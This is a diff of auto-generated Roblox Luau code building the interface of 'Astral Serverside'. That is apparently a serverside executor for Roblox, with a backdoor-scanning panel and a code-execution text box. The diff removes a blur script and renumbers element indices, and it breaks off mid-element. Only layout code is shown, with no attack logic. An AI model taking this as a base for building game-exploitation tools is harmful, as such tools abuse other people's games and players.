@@ -46,36 +46,50 @@ ASTRAL["6"] = Instance.new("LocalScript", ASTRAL["5"]);
 ASTRAL["6"]["Name"] = [[Rotation]];
 
 
--- StarterGui.Astral Serverside.MainFrame.Blur
-ASTRAL["7"] = Instance.new("LocalScript", ASTRAL["2"]);
-ASTRAL["7"]["Name"] = [[Blur]];
-
-
 -- StarterGui.Astral Serverside.MainFrame.Drag
-ASTRAL["8"] = Instance.new("LocalScript", ASTRAL["2"]);
-ASTRAL["8"]["Name"] = [[Drag]];
+ASTRAL["7"] = Instance.new("LocalScript", ASTRAL["2"]);
+ASTRAL["7"]["Name"] = [[Drag]];
 
 
 -- StarterGui.Astral Serverside.MainFrame.ScanningFrame
-ASTRAL["9"] = Instance.new("Frame", ASTRAL["2"]);
-ASTRAL["9"]["Visible"] = false;
-ASTRAL["9"]["BorderSizePixel"] = 0;
-ASTRAL["9"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-ASTRAL["9"]["ClipsDescendants"] = true;
-ASTRAL["9"]["Size"] = UDim2.new(1, 0, 1, 0);
-ASTRAL["9"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-ASTRAL["9"]["Name"] = [[ScanningFrame]];
-ASTRAL["9"]["BackgroundTransparency"] = 1;
+ASTRAL["8"] = Instance.new("Frame", ASTRAL["2"]);
+ASTRAL["8"]["Visible"] = false;
+ASTRAL["8"]["BorderSizePixel"] = 0;
+ASTRAL["8"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+ASTRAL["8"]["ClipsDescendants"] = true;
+ASTRAL["8"]["Size"] = UDim2.new(1, 0, 1, 0);
+ASTRAL["8"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+ASTRAL["8"]["Name"] = [[ScanningFrame]];
+ASTRAL["8"]["BackgroundTransparency"] = 1;
 
 
 -- StarterGui.Astral Serverside.MainFrame.ScanningFrame.Corner
-ASTRAL["a"] = Instance.new("UICorner", ASTRAL["9"]);
-ASTRAL["a"]["Name"] = [[Corner]];
-ASTRAL["a"]["CornerRadius"] = UDim.new(0, 12);
+ASTRAL["9"] = Instance.new("UICorner", ASTRAL["8"]);
+ASTRAL["9"]["Name"] = [[Corner]];
+ASTRAL["9"]["CornerRadius"] = UDim.new(0, 12);
 
 
 -- StarterGui.Astral Serverside.MainFrame.ScanningFrame.Description
-ASTRAL["b"] = Instance.new("TextLabel", ASTRAL["9"]);
+ASTRAL["a"] = Instance.new("TextLabel", ASTRAL["8"]);
+ASTRAL["a"]["TextWrapped"] = true;
+ASTRAL["a"]["TextStrokeTransparency"] = 0;
+ASTRAL["a"]["BorderSizePixel"] = 0;
+ASTRAL["a"]["TextSize"] = 14;
+ASTRAL["a"]["TextScaled"] = true;
+ASTRAL["a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+ASTRAL["a"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+ASTRAL["a"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+ASTRAL["a"]["BackgroundTransparency"] = 1;
+ASTRAL["a"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
+ASTRAL["a"]["Size"] = UDim2.new(1, -50, 0, 125);
+ASTRAL["a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+ASTRAL["a"]["Text"] = [[The game might freeze, don't worry it's scanning though.]];
+ASTRAL["a"]["Name"] = [[Description]];
+ASTRAL["a"]["Position"] = UDim2.new(0.5, 0, 0.5, 48);
+
+
+-- StarterGui.Astral Serverside.MainFrame.ScanningFrame.Title
+ASTRAL["b"] = Instance.new("TextLabel", ASTRAL["8"]);
 ASTRAL["b"]["TextWrapped"] = true;
 ASTRAL["b"]["TextStrokeTransparency"] = 0;
 ASTRAL["b"]["BorderSizePixel"] = 0;
@@ -85,611 +99,592 @@ ASTRAL["b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
 ASTRAL["b"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
 ASTRAL["b"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
 ASTRAL["b"]["BackgroundTransparency"] = 1;
-ASTRAL["b"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
-ASTRAL["b"]["Size"] = UDim2.new(1, -50, 0, 125);
+ASTRAL["b"]["Size"] = UDim2.new(1, 0, 0, 64);
 ASTRAL["b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-ASTRAL["b"]["Text"] = [[The game might freeze, don't worry it's scanning though.]];
-ASTRAL["b"]["Name"] = [[Description]];
-ASTRAL["b"]["Position"] = UDim2.new(0.5, 0, 0.5, 48);
-
-
--- StarterGui.Astral Serverside.MainFrame.ScanningFrame.Title
-ASTRAL["c"] = Instance.new("TextLabel", ASTRAL["9"]);
-ASTRAL["c"]["TextWrapped"] = true;
-ASTRAL["c"]["TextStrokeTransparency"] = 0;
-ASTRAL["c"]["BorderSizePixel"] = 0;
-ASTRAL["c"]["TextSize"] = 14;
-ASTRAL["c"]["TextScaled"] = true;
-ASTRAL["c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-ASTRAL["c"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-ASTRAL["c"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
-ASTRAL["c"]["BackgroundTransparency"] = 1;
-ASTRAL["c"]["Size"] = UDim2.new(1, 0, 0, 64);
-ASTRAL["c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-ASTRAL["c"]["Text"] = [[Astral Serverside]];
-ASTRAL["c"]["Name"] = [[Title]];
-ASTRAL["c"]["Position"] = UDim2.new(0, 0, 0, 10);
+ASTRAL["b"]["Text"] = [[Astral Serverside]];
+ASTRAL["b"]["Name"] = [[Title]];
+ASTRAL["b"]["Position"] = UDim2.new(0, 0, 0, 10);
 
 
 -- StarterGui.Astral Serverside.MainFrame.ScanningHandler
-ASTRAL["d"] = Instance.new("LocalScript", ASTRAL["2"]);
-ASTRAL["d"]["Name"] = [[ScanningHandler]];
+ASTRAL["c"] = Instance.new("LocalScript", ASTRAL["2"]);
+ASTRAL["c"]["Name"] = [[ScanningHandler]];
 
 
 -- StarterGui.Astral Serverside.MainFrame.ExecutionFrame
-ASTRAL["e"] = Instance.new("Frame", ASTRAL["2"]);
-ASTRAL["e"]["BorderSizePixel"] = 0;
-ASTRAL["e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-ASTRAL["e"]["ClipsDescendants"] = true;
-ASTRAL["e"]["Size"] = UDim2.new(1, 0, 1, 0);
-ASTRAL["e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-ASTRAL["e"]["Name"] = [[ExecutionFrame]];
-ASTRAL["e"]["BackgroundTransparency"] = 1;
+ASTRAL["d"] = Instance.new("Frame", ASTRAL["2"]);
+ASTRAL["d"]["BorderSizePixel"] = 0;
+ASTRAL["d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+ASTRAL["d"]["ClipsDescendants"] = true;
+ASTRAL["d"]["Size"] = UDim2.new(1, 0, 1, 0);
+ASTRAL["d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+ASTRAL["d"]["Name"] = [[ExecutionFrame]];
+ASTRAL["d"]["BackgroundTransparency"] = 1;
 
 
 -- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.Corner
-ASTRAL["f"] = Instance.new("UICorner", ASTRAL["e"]);
-ASTRAL["f"]["Name"] = [[Corner]];
-ASTRAL["f"]["CornerRadius"] = UDim.new(0, 12);
+ASTRAL["e"] = Instance.new("UICorner", ASTRAL["d"]);
+ASTRAL["e"]["Name"] = [[Corner]];
+ASTRAL["e"]["CornerRadius"] = UDim.new(0, 12);
 
 
 -- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox
-ASTRAL["10"] = Instance.new("Frame", ASTRAL["e"]);
-ASTRAL["10"]["BorderSizePixel"] = 0;
-ASTRAL["10"]["BackgroundColor3"] = Color3.fromRGB(81, 81, 81);
-ASTRAL["10"]["AnchorPoint"] = Vector2.new(0.5, 0);
-ASTRAL["10"]["ClipsDescendants"] = true;
-ASTRAL["10"]["Size"] = UDim2.new(1, -50, 0, 175);
-ASTRAL["10"]["Position"] = UDim2.new(0.5, 0, 0, 50);
-ASTRAL["10"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
-ASTRAL["10"]["Name"] = [[FastColoredTextbox]];
-ASTRAL["10"]["BackgroundTransparency"] = 1;
+ASTRAL["f"] = Instance.new("Frame", ASTRAL["d"]);
+ASTRAL["f"]["BorderSizePixel"] = 0;
+ASTRAL["f"]["BackgroundColor3"] = Color3.fromRGB(81, 81, 81);
+ASTRAL["f"]["AnchorPoint"] = Vector2.new(0.5, 0);
+ASTRAL["f"]["ClipsDescendants"] = true;
+ASTRAL["f"]["Size"] = UDim2.new(1, -50, 0, 175);
+ASTRAL["f"]["Position"] = UDim2.new(0.5, 0, 0, 50);
+ASTRAL["f"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
+ASTRAL["f"]["Name"] = [[FastColoredTextbox]];
+ASTRAL["f"]["BackgroundTransparency"] = 1;
 
 
 -- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Scroll
-ASTRAL["11"] = Instance.new("ScrollingFrame", ASTRAL["10"]);
-ASTRAL["11"]["Active"] = true;
-ASTRAL["11"]["ZIndex"] = 2;
-ASTRAL["11"]["BorderSizePixel"] = 0;
-ASTRAL["11"]["CanvasSize"] = UDim2.new(0, 0, 0, 0);
-ASTRAL["11"]["TopImage"] = [[]];
-ASTRAL["11"]["BackgroundColor3"] = Color3.fromRGB(81, 81, 81);
-ASTRAL["11"]["Name"] = [[Scroll]];
-ASTRAL["11"]["BottomImage"] = [[]];
-ASTRAL["11"]["Size"] = UDim2.new(1, 0, 1, 0);
-ASTRAL["11"]["ScrollBarImageColor3"] = Color3.fromRGB(43, 43, 43);
-ASTRAL["11"]["BorderColor3"] = Color3.fromRGB(127, 129, 126);
-ASTRAL["11"]["ScrollBarThickness"] = 17;
-ASTRAL["11"]["BackgroundTransparency"] = 1;
+ASTRAL["10"] = Instance.new("ScrollingFrame", ASTRAL["f"]);
+ASTRAL["10"]["Active"] = true;
+ASTRAL["10"]["ZIndex"] = 2;
+ASTRAL["10"]["BorderSizePixel"] = 0;
+ASTRAL["10"]["CanvasSize"] = UDim2.new(0, 0, 0, 0);
+ASTRAL["10"]["TopImage"] = [[]];
+ASTRAL["10"]["BackgroundColor3"] = Color3.fromRGB(81, 81, 81);
+ASTRAL["10"]["Name"] = [[Scroll]];
+ASTRAL["10"]["BottomImage"] = [[]];
+ASTRAL["10"]["Size"] = UDim2.new(1, 0, 1, 0);
+ASTRAL["10"]["ScrollBarImageColor3"] = Color3.fromRGB(43, 43, 43);
+ASTRAL["10"]["BorderColor3"] = Color3.fromRGB(127, 129, 126);
+ASTRAL["10"]["ScrollBarThickness"] = 17;
+ASTRAL["10"]["BackgroundTransparency"] = 1;
 
 
 -- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Scroll.TextBox
-ASTRAL["12"] = Instance.new("TextBox", ASTRAL["11"]);
-ASTRAL["12"]["TextXAlignment"] = Enum.TextXAlignment.Left;
-ASTRAL["12"]["BorderSizePixel"] = 0;
-ASTRAL["12"]["TextWrapped"] = true;
-ASTRAL["12"]["TextTransparency"] = 0.75;
-ASTRAL["12"]["TextSize"] = 15;
-ASTRAL["12"]["TextColor3"] = Color3.fromRGB(42, 42, 42);
-ASTRAL["12"]["TextYAlignment"] = Enum.TextYAlignment.Top;
-ASTRAL["12"]["BackgroundColor3"] = Color3.fromRGB(29, 35, 46);
-ASTRAL["12"]["RichText"] = true;
-ASTRAL["12"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-ASTRAL["12"]["MultiLine"] = true;
-ASTRAL["12"]["ClearTextOnFocus"] = false;
-ASTRAL["12"]["Size"] = UDim2.new(10, -27, 1, 0);
-ASTRAL["12"]["Position"] = UDim2.new(0, 17, 0, 0);
-ASTRAL["12"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-ASTRAL["12"]["Text"] = [[]];
-ASTRAL["12"]["BackgroundTransparency"] = 1;
+ASTRAL["11"] = Instance.new("TextBox", ASTRAL["10"]);
+ASTRAL["11"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+ASTRAL["11"]["BorderSizePixel"] = 0;
+ASTRAL["11"]["TextWrapped"] = true;
+ASTRAL["11"]["TextTransparency"] = 0.75;
+ASTRAL["11"]["TextSize"] = 15;
+ASTRAL["11"]["TextColor3"] = Color3.fromRGB(42, 42, 42);
+ASTRAL["11"]["TextYAlignment"] = Enum.TextYAlignment.Top;
+ASTRAL["11"]["BackgroundColor3"] = Color3.fromRGB(29, 35, 46);
+ASTRAL["11"]["RichText"] = true;
+ASTRAL["11"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+ASTRAL["11"]["MultiLine"] = true;
+ASTRAL["11"]["ClearTextOnFocus"] = false;
+ASTRAL["11"]["Size"] = UDim2.new(10, -27, 1, 0);
+ASTRAL["11"]["Position"] = UDim2.new(0, 17, 0, 0);
+ASTRAL["11"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+ASTRAL["11"]["Text"] = [[]];
+ASTRAL["11"]["BackgroundTransparency"] = 1;
 
 
 -- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Scroll.Highlighting
-ASTRAL["13"] = Instance.new("TextLabel", ASTRAL["11"]);
-ASTRAL["13"]["TextWrapped"] = true;
-ASTRAL["13"]["BorderSizePixel"] = 0;
-ASTRAL["13"]["TextSize"] = 15;
-ASTRAL["13"]["TextXAlignment"] = Enum.TextXAlignment.Left;
-ASTRAL["13"]["TextYAlignment"] = Enum.TextYAlignment.Top;
-ASTRAL["13"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-ASTRAL["13"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-ASTRAL["13"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
-ASTRAL["13"]["BackgroundTransparency"] = 1;
-ASTRAL["13"]["RichText"] = true;
-ASTRAL["13"]["Size"] = UDim2.new(10, -27, 1, 0);
-ASTRAL["13"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-ASTRAL["13"]["Text"] = [[]];
-ASTRAL["13"]["Name"] = [[Highlighting]];
-ASTRAL["13"]["Position"] = UDim2.new(0, 20, 0, 0);
+ASTRAL["12"] = Instance.new("TextLabel", ASTRAL["10"]);
+ASTRAL["12"]["TextWrapped"] = true;
+ASTRAL["12"]["BorderSizePixel"] = 0;
+ASTRAL["12"]["TextSize"] = 15;
+ASTRAL["12"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+ASTRAL["12"]["TextYAlignment"] = Enum.TextYAlignment.Top;
+ASTRAL["12"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+ASTRAL["12"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+ASTRAL["12"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+ASTRAL["12"]["BackgroundTransparency"] = 1;
+ASTRAL["12"]["RichText"] = true;
+ASTRAL["12"]["Size"] = UDim2.new(10, -27, 1, 0);
+ASTRAL["12"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+ASTRAL["12"]["Text"] = [[]];
+ASTRAL["12"]["Name"] = [[Highlighting]];
+ASTRAL["12"]["Position"] = UDim2.new(0, 20, 0, 0);
 
 
 -- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Scroll.LineSelector
-ASTRAL["14"] = Instance.new("Frame", ASTRAL["11"]);
-ASTRAL["14"]["ZIndex"] = -7;
-ASTRAL["14"]["BorderSizePixel"] = 0;
-ASTRAL["14"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-ASTRAL["14"]["Size"] = UDim2.new(1, 0, 0, 15);
-ASTRAL["14"]["Position"] = UDim2.new(0, 20, 0, 0);
-ASTRAL["14"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-ASTRAL["14"]["Name"] = [[LineSelector]];
-ASTRAL["14"]["BackgroundTransparency"] = 1;
+ASTRAL["13"] = Instance.new("Frame", ASTRAL["10"]);
+ASTRAL["13"]["ZIndex"] = -7;
+ASTRAL["13"]["BorderSizePixel"] = 0;
+ASTRAL["13"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+ASTRAL["13"]["Size"] = UDim2.new(1, 0, 0, 15);
+ASTRAL["13"]["Position"] = UDim2.new(0, 20, 0, 0);
+ASTRAL["13"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+ASTRAL["13"]["Name"] = [[LineSelector]];
+ASTRAL["13"]["BackgroundTransparency"] = 1;
 
 
 -- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Scroll.Cursor
-ASTRAL["15"] = Instance.new("Frame", ASTRAL["11"]);
-ASTRAL["15"]["BorderSizePixel"] = 0;
-ASTRAL["15"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-ASTRAL["15"]["Size"] = UDim2.new(0, 1, 0, 15);
-ASTRAL["15"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-ASTRAL["15"]["Name"] = [[Cursor]];
+ASTRAL["14"] = Instance.new("Frame", ASTRAL["10"]);
+ASTRAL["14"]["BorderSizePixel"] = 0;
+ASTRAL["14"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+ASTRAL["14"]["Size"] = UDim2.new(0, 1, 0, 15);
+ASTRAL["14"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+ASTRAL["14"]["Name"] = [[Cursor]];
 
 
 -- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Scroll.TextMeasurer
-ASTRAL["16"] = Instance.new("TextLabel", ASTRAL["11"]);
-ASTRAL["16"]["BorderSizePixel"] = 0;
-ASTRAL["16"]["TextSize"] = 15;
-ASTRAL["16"]["TextXAlignment"] = Enum.TextXAlignment.Left;
-ASTRAL["16"]["TextYAlignment"] = Enum.TextYAlignment.Top;
-ASTRAL["16"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-ASTRAL["16"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-ASTRAL["16"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
-ASTRAL["16"]["BackgroundTransparency"] = 1;
-ASTRAL["16"]["RichText"] = true;
-ASTRAL["16"]["Size"] = UDim2.new(10, -27, 1, 0);
-ASTRAL["16"]["Visible"] = false;
-ASTRAL["16"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-ASTRAL["16"]["Text"] = [[]];
-ASTRAL["16"]["Name"] = [[TextMeasurer]];
-ASTRAL["16"]["Position"] = UDim2.new(0, 20, 0, 0);
+ASTRAL["15"] = Instance.new("TextLabel", ASTRAL["10"]);
+ASTRAL["15"]["BorderSizePixel"] = 0;
+ASTRAL["15"]["TextSize"] = 15;
+ASTRAL["15"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+ASTRAL["15"]["TextYAlignment"] = Enum.TextYAlignment.Top;
+ASTRAL["15"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+ASTRAL["15"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+ASTRAL["15"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+ASTRAL["15"]["BackgroundTransparency"] = 1;
+ASTRAL["15"]["RichText"] = true;
+ASTRAL["15"]["Size"] = UDim2.new(10, -27, 1, 0);
+ASTRAL["15"]["Visible"] = false;
+ASTRAL["15"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+ASTRAL["15"]["Text"] = [[]];
+ASTRAL["15"]["Name"] = [[TextMeasurer]];
+ASTRAL["15"]["Position"] = UDim2.new(0, 20, 0, 0);
 
 
 -- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Scroll.LinesValue
-ASTRAL["17"] = Instance.new("NumberValue", ASTRAL["11"]);
-ASTRAL["17"]["Name"] = [[LinesValue]];
-ASTRAL["17"]["Value"] = 1;
+ASTRAL["16"] = Instance.new("NumberValue", ASTRAL["10"]);
+ASTRAL["16"]["Name"] = [[LinesValue]];
+ASTRAL["16"]["Value"] = 1;
 
 
 -- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Scroll.LinesFrame
-ASTRAL["18"] = Instance.new("Frame", ASTRAL["11"]);
-ASTRAL["18"]["BorderSizePixel"] = 0;
-ASTRAL["18"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
-ASTRAL["18"]["Size"] = UDim2.new(0, 17, 17.91826, 0);
-ASTRAL["18"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-ASTRAL["18"]["Name"] = [[LinesFrame]];
-ASTRAL["18"]["BackgroundTransparency"] = 0.85;
+ASTRAL["17"] = Instance.new("Frame", ASTRAL["10"]);
+ASTRAL["17"]["BorderSizePixel"] = 0;
+ASTRAL["17"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+ASTRAL["17"]["Size"] = UDim2.new(0, 17, 17.91826, 0);
+ASTRAL["17"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+ASTRAL["17"]["Name"] = [[LinesFrame]];
+ASTRAL["17"]["BackgroundTransparency"] = 0.85;
 
 
 -- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Scroll.LinesFrame.TextLabelTemplate
-ASTRAL["19"] = Instance.new("TextLabel", ASTRAL["18"]);
-ASTRAL["19"]["TextWrapped"] = true;
-ASTRAL["19"]["BorderSizePixel"] = 0;
-ASTRAL["19"]["TextSize"] = 15;
-ASTRAL["19"]["TextScaled"] = true;
-ASTRAL["19"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-ASTRAL["19"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-ASTRAL["19"]["TextColor3"] = Color3.fromRGB(205, 205, 205);
-ASTRAL["19"]["BackgroundTransparency"] = 1;
-ASTRAL["19"]["Size"] = UDim2.new(0, 17, 0, 15);
-ASTRAL["19"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-ASTRAL["19"]["Text"] = [[1]];
-ASTRAL["19"]["Name"] = [[TextLabelTemplate]];
+ASTRAL["18"] = Instance.new("TextLabel", ASTRAL["17"]);
+ASTRAL["18"]["TextWrapped"] = true;
+ASTRAL["18"]["BorderSizePixel"] = 0;
+ASTRAL["18"]["TextSize"] = 15;
+ASTRAL["18"]["TextScaled"] = true;
+ASTRAL["18"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+ASTRAL["18"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+ASTRAL["18"]["TextColor3"] = Color3.fromRGB(205, 205, 205);
+ASTRAL["18"]["BackgroundTransparency"] = 1;
+ASTRAL["18"]["Size"] = UDim2.new(0, 17, 0, 15);
+ASTRAL["18"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+ASTRAL["18"]["Text"] = [[1]];
+ASTRAL["18"]["Name"] = [[TextLabelTemplate]];
 
 
 -- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Scroll.LinesFrame.UIListLayout
-ASTRAL["1a"] = Instance.new("UIListLayout", ASTRAL["18"]);
-ASTRAL["1a"]["SortOrder"] = Enum.SortOrder.LayoutOrder;
+ASTRAL["19"] = Instance.new("UIListLayout", ASTRAL["17"]);
+ASTRAL["19"]["SortOrder"] = Enum.SortOrder.LayoutOrder;
 
 
 -- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Handler
-ASTRAL["1b"] = Instance.new("LocalScript", ASTRAL["10"]);
-ASTRAL["1b"]["Name"] = [[Handler]];
+ASTRAL["1a"] = Instance.new("LocalScript", ASTRAL["f"]);
+ASTRAL["1a"]["Name"] = [[Handler]];
 
 
 -- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Y_Top
-ASTRAL["1c"] = Instance.new("Frame", ASTRAL["10"]);
-ASTRAL["1c"]["Visible"] = false;
-ASTRAL["1c"]["ZIndex"] = 3;
-ASTRAL["1c"]["BorderSizePixel"] = 0;
-ASTRAL["1c"]["BackgroundColor3"] = Color3.fromRGB(69, 69, 69);
-ASTRAL["1c"]["Size"] = UDim2.new(0, 17, 0, 17);
-ASTRAL["1c"]["Position"] = UDim2.new(1, -17, 0, 0);
-ASTRAL["1c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-ASTRAL["1c"]["Name"] = [[Y_Top]];
+ASTRAL["1b"] = Instance.new("Frame", ASTRAL["f"]);
+ASTRAL["1b"]["Visible"] = false;
+ASTRAL["1b"]["ZIndex"] = 3;
+ASTRAL["1b"]["BorderSizePixel"] = 0;
+ASTRAL["1b"]["BackgroundColor3"] = Color3.fromRGB(69, 69, 69);
+ASTRAL["1b"]["Size"] = UDim2.new(0, 17, 0, 17);
+ASTRAL["1b"]["Position"] = UDim2.new(1, -17, 0, 0);
+ASTRAL["1b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+ASTRAL["1b"]["Name"] = [[Y_Top]];
 
 
 -- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Y_Top.Arrow
-ASTRAL["1d"] = Instance.new("Frame", ASTRAL["1c"]);
-ASTRAL["1d"]["Size"] = UDim2.new(0, 16, 0, 16);
-ASTRAL["1d"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
-ASTRAL["1d"]["Name"] = [[Arrow]];
-ASTRAL["1d"]["BackgroundTransparency"] = 1;
+ASTRAL["1c"] = Instance.new("Frame", ASTRAL["1b"]);
+ASTRAL["1c"]["Size"] = UDim2.new(0, 16, 0, 16);
+ASTRAL["1c"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
+ASTRAL["1c"]["Name"] = [[Arrow]];
+ASTRAL["1c"]["BackgroundTransparency"] = 1;
 
 
 -- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Y_Top.Arrow.Frame
-ASTRAL["1e"] = Instance.new("Frame", ASTRAL["1d"]);
+ASTRAL["1d"] = Instance.new("Frame", ASTRAL["1c"]);
+ASTRAL["1d"]["BorderSizePixel"] = 0;
+ASTRAL["1d"]["BackgroundColor3"] = Color3.fromRGB(205, 205, 205);
+ASTRAL["1d"]["Size"] = UDim2.new(0, 7, 0, 1);
+ASTRAL["1d"]["Position"] = UDim2.new(0, 5, 0, 9);
+ASTRAL["1d"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
+ASTRAL["1d"]["BackgroundTransparency"] = 0.5;
+
+
+-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Y_Top.Arrow.Frame
+ASTRAL["1e"] = Instance.new("Frame", ASTRAL["1c"]);
 ASTRAL["1e"]["BorderSizePixel"] = 0;
 ASTRAL["1e"]["BackgroundColor3"] = Color3.fromRGB(205, 205, 205);
-ASTRAL["1e"]["Size"] = UDim2.new(0, 7, 0, 1);
-ASTRAL["1e"]["Position"] = UDim2.new(0, 5, 0, 9);
+ASTRAL["1e"]["Size"] = UDim2.new(0, 5, 0, 1);
+ASTRAL["1e"]["Position"] = UDim2.new(0, 6, 0, 8);
 ASTRAL["1e"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
 ASTRAL["1e"]["BackgroundTransparency"] = 0.5;
 
 
 -- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Y_Top.Arrow.Frame
-ASTRAL["1f"] = Instance.new("Frame", ASTRAL["1d"]);
+ASTRAL["1f"] = Instance.new("Frame", ASTRAL["1c"]);
 ASTRAL["1f"]["BorderSizePixel"] = 0;
 ASTRAL["1f"]["BackgroundColor3"] = Color3.fromRGB(205, 205, 205);
-ASTRAL["1f"]["Size"] = UDim2.new(0, 5, 0, 1);
-ASTRAL["1f"]["Position"] = UDim2.new(0, 6, 0, 8);
+ASTRAL["1f"]["Size"] = UDim2.new(0, 3, 0, 1);
+ASTRAL["1f"]["Position"] = UDim2.new(0, 7, 0, 7);
 ASTRAL["1f"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
 ASTRAL["1f"]["BackgroundTransparency"] = 0.5;
 
 
 -- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Y_Top.Arrow.Frame
-ASTRAL["20"] = Instance.new("Frame", ASTRAL["1d"]);
+ASTRAL["20"] = Instance.new("Frame", ASTRAL["1c"]);
 ASTRAL["20"]["BorderSizePixel"] = 0;
 ASTRAL["20"]["BackgroundColor3"] = Color3.fromRGB(205, 205, 205);
-ASTRAL["20"]["Size"] = UDim2.new(0, 3, 0, 1);
-ASTRAL["20"]["Position"] = UDim2.new(0, 7, 0, 7);
+ASTRAL["20"]["Size"] = UDim2.new(0, 1, 0, 1);
